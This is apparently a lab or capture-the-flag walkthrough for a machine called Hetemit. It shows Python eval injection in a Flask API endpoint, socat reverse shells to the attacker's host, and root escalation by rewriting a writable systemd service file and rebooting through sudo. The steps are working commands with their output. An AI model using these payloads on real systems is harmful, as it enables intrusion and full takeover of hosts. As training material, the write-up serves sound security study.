_____

# Exploitation Guide for Hetemit

## Summary

In this walkthrough, we'll exploit a custom API endpoint and a dangerous Python module, then escalate by abusing write permissions on a service file. We'll speed up exploitation by abusing a sudo misconfiguration on **/sbin/reboot**.

## Enumeration

### Nmap

We'll start off with an `nmap` scan against all TCP ports.

```
kali@kali:~$ sudo nmap -p- 192.168.120.36
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 16:16 -03
Nmap scan report for 192.168.120.36
Host is up (0.13s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
18000/tcp open  biimenu
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 265.36 seconds

kali@kali:~$ sudo nmap -p 18000,50000 -sC -sV 192.168.120.36
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 16:21 -03
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.64% done; ETC: 16:21 (0:00:00 remaining)
Nmap scan report for 192.168.120.36
Host is up (0.13s latency).

PORT      STATE SERVICE  VERSION
18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http     Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
...
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.93 seconds

```

### Web Enumeration

After some basic enumeration, we discover that the application running on port 18000 presents a standard web page.

```
kali@kali:~$ curl http://192.168.120.36:18000/ 
<!DOCTYPE HTML>
<html>
	<head>
		<title>Eventually by HTML5 UP</title>
...
	</head>
	<body class="is-preload">
    <!-- Header -->
    <header id="header">
        <h1>Protomba</h1>
        <p>Making the world a better place</p>
    </header>

    <p>Protomba is more than just a random Idea. 
Blockchain, Shopping and Community are just a few characteristic of Protomba. But we offer a lot more!</p>

<p>Want to join us? Please <a href="/users/new">register</a> today for a new account, or  <a href="/login">login</a> if you are already part of the team.</p>
...
		<!-- Scripts -->
    <script src="/packs/js/application-3cb580aa33ebf70324a3.js" data-turbolinks-track="reload"></script>

	</body>
</html>
```

The application on port 50000 seems to host an API used to generate invite codes.

```
kali@kali:~$ curl http://192.168.120.36:50000/
{'/generate', '/verify'}

kali@kali:~$ curl http://192.168.120.36:50000/generate
{'email@domain'}

kali@kali:~$ curl http://192.168.120.36:50000/verify
{'code'}
```

The application running on port 18000 requires an invite code to allow registration of an account.

To generate an invite code, we need to send a `POST /generate` request to the application running on port 50000. From the earlier response, we know that we need to include an email address.

```
kali@kali:~$ curl -X POST --data "email=test@testing" http://192.168.120.36:50000/generate
5a81d05b8969fd1f156969da357bcd7f9bf0430c90035f017c88f9b5249b3e9e
```

With this invite code, we can now register to the main application. However, this seems to be a dead end, since it doesn't seem like we can manipulate the application after we finally log in.

If we continue our enumeration on port 50000, we discover that the `verify` endpoint exhibits odd behavior:

```
kali@kali:~$ curl -X POST --data "code=code" http://192.168.120.36:50000/verify
code
```

```
kali@kali:~$ curl -X POST --data "code=5a81d05b8969fd1f156969da357bcd7f9bf0430c90035f017c88f9b5249b3e9e" http://192.168.120.36:50000/verify 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

```
kali@kali:~$  curl -X POST --data "code=2+2" http://192.168.120.36:50000/verify
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

It seems that the `verify` option doesn't actually verify the code. In addition, the application performs evaluation:

```
kali@kali:~$ curl -X POST --data "code=2*2" http://192.168.120.36:50000/verify
4
```

## Exploitation

Knowing that this server is running `Python/3.6.8` (thanks to our `nmap` output), let's attempt to use the highly dangerous `os` module.

```
kali@kali:~$ curl -X POST --data "code=os" http://192.168.120.36:50000/verify
<module 'os' from '/usr/lib64/python3.6/os.py'>
```

The existence of this module all but guarantees we can get a shell. Let's set up a listener.

```
kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
```

Next, we'll create a reverse shell connection.

```
kali@kali:~$ curl -X POST --data "code=os.system('socat TCP:192.168.118.8:18000 EXEC:sh')" http://192.168.120.36:50000/verify
```

Nice! We caught a reverse shell.

```
kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.36] 44872
python3 -c 'import pty; pty.spawn("/bin/bash")'

[cmeeks@hetemit restjson_hetemit]$ whoami
cmeeks
```

## Escalation

### Enumeration

As we enumerate the system, we'll search for writeable configuration files.

```
[cmeeks@hetemit restjson_hetemit]$ find /etc -type f -writable 2> /dev/null
find /etc -type f -writable 2> /dev/null
/etc/systemd/system/pythonapp.service
```

According to this, we can write to **pythonapp.service**, which appears to be some kind of system service. Next, we'll check our sudo permissions.

```
[cmeeks@hetemit ~]$ sudo -l    
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

This indicates that we can reboot and shutdown the computer.

### Incorrect File Permissions

Let's check the contents of **pythonapp.service**.

```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Perfect. We can modify this file to escalate to root. We'll modify this file to run a reverse shell, then restart the system. Once the system restarts, our shell should run as a system service. Let's modify **pythonapp.service**.

```
[cmeeks@hetemit ~]$ cat <<'EOT'> /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
ExecStart=/home/cmeeks/reverse.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOT
```

Specifically, we modified the `ExecStart` and `User` lines, and removed the `WorkingDirectory=` line.

Next, we'll create the reverse shell file.

```
[cmeeks@hetemit ~]$ cat <<'EOT'> /home/cmeeks/reverse.sh
#!/bin/bash
socat TCP:192.168.118.8:18000 EXEC:sh
EOT

[cmeeks@hetemit ~]$ chmod +x /home/cmeeks/reverse.sh
```

Let's restart our listener on port 18000, and then reboot the machine.

```
[cmeeks@hetemit ~]$ sudo reboot
```

When the machine boots up, we obtain a root shell.

```
kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.36] 57890
python3 -c 'import pty; pty.spawn("/bin/bash")'

[root@hetemit /]# whoami
root

[root@hetemit /]# 
```
